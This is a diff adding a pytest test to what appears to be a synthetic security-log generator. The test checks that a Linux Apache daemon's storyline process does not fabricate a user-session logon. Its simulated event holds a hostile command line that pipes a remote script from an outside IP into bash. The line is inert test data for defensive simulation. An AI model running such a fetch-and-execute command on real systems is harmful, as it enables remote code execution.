@@ -31,6 +31,7 @@ from evidenceforge.generation.activity import ActivityGenerator
 from evidenceforge.generation.engine.storyline import StorylineMixin
 from evidenceforge.generation.state_manager import StateManager
 from evidenceforge.models import System, User
+from evidenceforge.models.scenario import ProcessEventSpec
 
 
 @pytest.fixture
@@ -668,3 +669,49 @@ def test_log_cleared_storyline_event_rejects_different_actor_wevtutil_logon_id(
     )
 
     assert captured["subject_logon_id"] is None
+
+
+def test_linux_daemon_storyline_process_does_not_create_service_logon(state_manager):
+    """Linux web-daemon storyline processes should not fabricate user-session logins."""
+    engine = type("FakeEngine", (StorylineMixin,), {}).__new__(
+        type("FakeEngine", (StorylineMixin,), {})
+    )
+    web_system = System(
+        hostname="WEB-EXT-01",
+        ip="10.10.3.10",
+        os="Ubuntu 22.04",
+        type="server",
+        roles=["web_server"],
+    )
+    apache = User(
+        username="apache",
+        full_name="Apache",
+        email="apache@system.local",
+        enabled=True,
+    )
+    activity = Mock()
+    activity.generate_process.return_value = 24119
+    activity._resolve_parent.return_value = 24118
+    engine.activity_generator = activity
+    engine.state_manager = state_manager
+    engine.dispatcher = Mock()
+    engine.world_planner = Mock()
+    engine.scenario = Mock()
+    engine.scenario.environment.service_accounts = ["apache"]
+
+    event = engine._execute_typed_event(
+        ProcessEventSpec(
+            process_name="/bin/bash",
+            command_line="bash -c 'curl -fsSL http://45.33.32.30/p.sh | bash'",
+        ),
+        apache,
+        web_system,
+        datetime(2024, 3, 18, 13, 19, 47, tzinfo=UTC),
+        "Apache spawned shell",
+        {"process"},
+    )
+
+    activity.generate_service_logon.assert_not_called()
+    activity.generate_process.assert_called_once()
+    assert activity.generate_process.call_args.kwargs["logon_id"] == ""
+    assert event["pid"] == 24119
